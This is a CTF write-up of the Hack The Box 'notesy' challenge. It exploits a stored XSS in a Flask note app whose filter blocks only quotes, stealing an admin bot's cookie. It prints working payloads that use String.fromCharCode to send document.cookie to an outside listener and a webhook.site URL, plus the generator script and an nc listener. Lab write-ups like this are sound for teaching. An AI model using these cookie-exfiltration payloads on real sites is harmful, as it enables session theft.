+++
title = "notesy"
date = 2025-11-28
draft = false
tags = ["web", "xss", "selenium", "flask"]
categories = ["writeups"]
ctf = "hack the box - notesy"
points = 0
solves = 0
+++

## tl;dr

stored xss with a baby filter, selenium bot with the flag in a cookie, steal it with `document.cookie` and `String.fromCharCode` because quotes are illegal now.

## what we're dealing with

the challenge is a “secure” note-taking app called `notesy`, which is already a red flag because nothing that calls itself secure ever is.  
i get a docker setup with a `flask` app, `chromium`, and `selenium` in the image, which screams “hi, i’m an xss admin bot, please abuse me”.

the flag lives in `/flag.txt` on the container, and if there’s one thing ctf authors love, it’s shoving that into a cookie and pretending it’s safe.  
spoiler: that’s exactly what happens.

## initial recon (aka pretending i know what i'm doing)

i started by poking around the repo like a responsible adult instead of just firing burp and yoloing payloads (growth, i guess).

```bash
ls
build-docker.sh  challenge  config  Dockerfile  flag.txt

ls challenge
app.py  bot.py  templates
```

`Dockerfile` immediately outs the whole setup:

```bash
cat Dockerfile
```

- python 3.9 on alpine  
- installs `chromium` and `chromium-chromedriver`  
- installs `flask` and `selenium`  
- copies `/flag.txt` to `/`  

this is basically a giant neon sign saying: “there’s an admin bot, it will visit your link, good luck not embarrassing yourself.”

then i opened `app.py` and `bot.py` like a good little reverse engineer instead of just randomly fuzzing routes:

```bash
cat challenge/app.py challenge/bot.py
```

and, well.

## digging deeper (into my own confusion)

the `flask` app first:

```python
app = Flask(__name__)

notes = {}

def is_safe_content(content):
    decoded_content = unquote(content)
    
    if re.search(r'[\'"`]', decoded_content, re.IGNORECASE):
        return False
    return True
```

so the “waf” is:  
if your content has `'`, `"`, or backticks, it dies.  
no blacklisting of `<`, `>`, `(`, `)`, or literally any other thing that matters for javascript.  
10/10 security, would deploy to production.

note creation:

```python
if request.method == 'POST':
    title = request.form['title']
    content = request.form['content']
    
    if is_safe_content(content):
        note_id = str(uuid.uuid4())
        note_url = url_for('view_note', note_id=note_id)
        notes[note_id] = {'title': title, 'content': content, 'url': note_url}
        return redirect(note_url)
    else:
        return "Invalid content detected. Note not created.", 400
```

note view:

```python
@app.route('/note/<note_id>', methods=['GET'])
def view_note(note_id):
    note = notes.get(note_id)
    if note:
        return render_template('view_note.html', note=note)
    return "Note not found.", 404
```

the real crime happens in `view_note.html`:

```html
<p>{{ note['content'] | safe }}</p>
```

that `| safe` is a classic “please xss me” flag from `jinja2`.
autoescaping is disabled for that content, and since `is_safe_content` is laughable, user input goes straight into the dom as raw html.

so yeah. stored xss with a small “no quotes allowed” dress code.

then there’s the bot:

```python
def bot_runner(link):
    chrome_options = Options()
    chrome_options.add_argument("headless")
    ...
    client = webdriver.Chrome(options=chrome_options)
    client.get("http://127.0.0.1:1337")

    cookie = {
        "name": "FLAG",
        "value": open('/flag.txt').read().strip(),
        "domain": "127.0.0.1",
        "path": "/",
        "secure": False,
        "httpOnly": False
    }
    client.add_cookie(cookie)
    client.get(link)
    time.sleep(5)
    client.quit()
```

so the flow:

- bot opens `http://127.0.0.1:1337`  
- sets cookie `FLAG=<real_flag>` for domain `127.0.0.1`  
- visits the url we give it  
- doesn’t even mark it `HttpOnly`, so javascript can read it just fine

this is the part where the challenge basically looks at us and says: “if you can’t solve this, maybe knitting is more your thing.”

## the actual work begins (aka suffering)

i started with the obvious: just drop a normal `<script>alert(1)</script>` in the note content, because who knows, maybe the filter is a bluff.

nope. that actually worked.  
of course it did. no `<`/`>` filter, no html sanitization, everything is rendered with `| safe`.  
this is not a challenge, this is a personality test.

unfortunately, using `document.location='http://my-ip:port/?c='+document.cookie` needs quotes.  
quotes are banned.  
so javascript works, but strings don’t. which is… mildly inconvenient.

after thinking about it for an embarrassing amount of time, i remembered `String.fromCharCode`, also known as “how to write javascript like it’s 2006 again”:

```javascript
String.fromCharCode(104,116,116,112,58,47,47,...)
```

you can build strings out of character codes without quotes. and the waf does not care about digits or commas. so the plan turned into:

- construct the exfiltration url with `String.fromCharCode`  
- append `document.cookie` to it  
- assign to `window.location`  
- profit

easy in theory.  
in practice, welcome to the “i keep exploiting myself” chapter.

## exploitation strategy (using that word loosely)

my galaxy brain approach:

1. spin up a listener on my box  
2. generate payload that redirects to `http://myip:port/?flag=` + `document.cookie`  
3. inject into note content  
4. send internal url to bot via `/report`  
5. receive flag, question my life choices

listener:

```bash
nc -lvnp 7747
```

payload generator:

```bash
python3 -c '
ip = "86.201.43.87"
port = "7747"
base_url = f"http://{ip}:{port}/?flag="
ords = ",".join([str(ord(c)) for c in base_url])
print(f"<script>window.location=String.fromCharCode({ords})+document.cookie</script>")
'
```

output:

```html
<script>window.location=String.fromCharCode(104,116,116,112,58,47,47,56,54,46,50,48,49,46,52,51,46,56,55,58,55,55,52,55,47,63,102,108,97,103,61)+document.cookie</script>
```

i drop that into the note.  
i open the note in my browser like a clown.  
`nc` shows:

```http
GET /?flag= HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
```

no cookie. just an empty `flag` param.  
also the tab keeps loading forever because `nc` doesn’t send a response and the browser just sits there waiting. 10/10 ux.

this is the moment i realized:  
i just xss’d myself.

the request was from *my* firefox, not from headless chrome in the container.  
so i successfully proved the payload works, and equally successfully got absolutely nothing useful.

pro gamer moment.

## rabbit holes i enthusiastically dove into

### rabbit hole #1: “maybe the bot can reach my lan”

in my infinite optimism, i assumed the dockerized bot, running on some random host somewhere, could connect to my `192.168.x.x` or my public ip on port `7747`.  
this obviously requires port forwarding, firewall rules, and generally more effort than my router is willing to tolerate.

i wasted time staring at `nc` like:

```bash
listening on [any] 7747 ...
```

and every time i re-submitted a report, i hoped to see a new connection from some mysterious server.  
instead, it was just my browser re-triggering the redirect because apparently i never learn.

future me would like to slap past me for not immediately switching to a public exfil service.

### rabbit hole #2: overthinking the waf

for a solid 20 minutes i entertained the idea that maybe i should do something “fancy”, like:

- dom clobbering  
- abusing `onerror` without parentheses  
- using `<img src=x onerror=location=...>` kind of payloads

and then i remembered: i have full `<script>` execution and the only thing blocked is quotes.  
this is not tagless xss. this is diet xss. zero sugar, zero challenge.

## time to break stuff (mostly my sanity)

eventually i stopped trying to be clever and did the sensible thing: use a webhook service that the bot can actually reach.  
no nat. no port forwarding. no router negotiations. just pure cloud-based shame delivery.

### step 1: webhook setup

i used something like webhook.site.  
you get a unique url like:

```text
https://webhook.site/some-uuid-here
```

this will happily collect any `GET`/`POST` request and show all query params, including cookies we yeet into the url.

### step 2: payload generation (the less stupid version)

```bash
python3 -c '
url = "https://webhook.site/some-uuid-here"
target = f"{url}?c="
ords = ",".join([str(ord(c)) for c in target])
print(f"<script>window.location=String.fromCharCode({ords})+document.cookie</script>")
'
```

that gives:

```html
<script>window.location=String.fromCharCode(104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,46,115,105,116,101,47,115,111,109,101,45,117,117,105,100,45,104,101,114,101,63,99,61)+document.cookie</script>
```

no quotes. digits only. the waf just shrugs and lets it pass.

### step 3: stored xss setup

1. go to `/`  
2. create a note:  
   - title: `pls give cookie`  
   - content: the `<script>...</script>` payload above  
3. submit, get redirected to `/note/<uuid>`

### step 4: report to the bot correctly

here’s the important bit:  
the bot does `client.get("http://127.0.0.1:1337")` to prime the cookie.  
that means it sees the app as `127.0.0.1:1337`, not as `94.237.63.174:40159`.

so in `/report`, i must give it:

```text
http://127.0.0.1:1337/note/<my-note-uuid>
```

not the external ip.  
not some fake nginx url.  
literally the internal endpoint the bot will understand.

submit that, and this time i don’t open the note myself, which is already a massive upgrade.

### step 5: the callback

after a few seconds, webhook shows a new request:

- method: `GET`  
- query param `c`: something like `FLAG=flag{*******}`  

and that’s it. we win. the flag rides in the url via `document.cookie`, because the admins kindly made it:

- not `HttpOnly`  
- scoped to `127.0.0.1` which matches the app domain  
- perfectly reachable from javascript

## failed attempts (a comprehensive list)

- xss’ing myself like five times because i kept opening the note before sending it to the bot  
- staring at empty `flag=` params in `nc` wondering why “the bot sends no cookie”  
- assuming my router would magically cooperate for direct `nc` exfil  
- briefly considering rewriting the payload using some cursed javascript trick before remembering `String.fromCharCode` exists  
- initially trying `location.href=...` before realizing it doesn’t matter and i was just changing syntax for fun

if you’re reading this hoping to learn something, i have bad news:  
the main lesson is “don’t debug your payload in your own browser when you’re trying to steal someone else’s cookies.”

## actually getting it to work (shocking)

the final working flow:

1. identify stored xss via `| safe` in `jinja2` on untrusted input
2. notice weak waf that only blocks `'`, `"`, and backticks  
3. abuse `String.fromCharCode` to build exfiltration url without quotes  
4. use `window.location = <constructed_url> + document.cookie` to exfil  
5. send internal url `http://127.0.0.1:1337/note/<uuid>` to `/report`  
6. let selenium headless chrome run the payload with `FLAG=<real_flag>` in cookie
7. read flag from webhook dashboard like some kind of script kiddie genius

no complex dom tricks. no csp bypass. just diet stored xss and a lazy cookie.

## final exploit (after 47 attempts)

here’s the “exploit”, if you can even call it that.

```bash
# generate payload for webhook
python3 -c '
url = "https://webhook.site/some-uuid-here"  # replace this
target = f"{url}?c="
ords = ",".join([str(ord(c)) for c in target])
print(f"<script>window.location=String.fromCharCode({ords})+document.cookie</script>")
'
```

1. paste that `<script>` into note content  
2. submit note, get `/note/<uuid>`  
3. submit to `/report`:

```text
http://127.0.0.1:1337/note/<uuid>
```

4. wait for webhook to show something like:

```text
https://webhook.site/some-uuid-here?c=FLAG=flag{*******}
```

that’s it. no shell. no rop chain. just violence against front-end sanity.

## flag

the flag pops up in the webhook query string like:

> wow, all this suffering just to read one cookie. worth it.  

turns out the solution was embarrassingly simple.  
as usual, the hardest part was me.
